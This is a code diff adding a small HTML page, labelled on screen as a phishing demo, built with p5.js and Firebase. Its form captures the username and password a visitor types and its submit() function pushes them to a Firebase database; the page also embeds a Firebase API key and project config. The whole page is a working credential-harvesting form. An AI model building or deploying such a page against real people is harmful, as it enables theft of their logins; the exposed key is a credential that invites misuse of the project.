@@ -1,0 +1,37 @@
+<html>
+  <head>
+    <script src="../../js/p5.js"></script>
+    <script src="../../js/p5.dom.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/3.6.7/firebase.js"></script>
+    <script src="sketch.js"></script>
+    <script>var config = {
+      apiKey: "AIzaSyC6FJ_sG5bdJ72YrkAkMwMJb3FZFKIHY_g",
+      authDomain: "my-awesome-project-d15df.firebaseapp.com",
+      databaseURL: "https://my-awesome-project-d15df.firebaseio.com",
+      storageBucket: "my-awesome-project-d15df.appspot.com",
+      messagingSenderId: "157219853903"
+    };
+    firebase.initializeApp(config);
+    var database = firebase.database();
+    var ref = database.ref('data');
+    function submit(){
+      data = {
+        user: document.getElementById('username').value,
+        pass: document.getElementById('password').value
+      }
+
+      ref.push(data);
+    }
+    console.log('load');
+    </script>
+  </head>
+  <body>
+<h1>This is a phishing demo, we will know what you type in the form. Use cautiously</h1>
+USERNAME:
+<input id='username' type="text" name="username" value="" maxlength="100" />
+<br />
+Password
+<input id="password" type="password" name="passoword" value="" maxlength="100" />
+<input type="submit" value="Submit" onclick="javascript:submit()"/>
+  </body>
+</html>
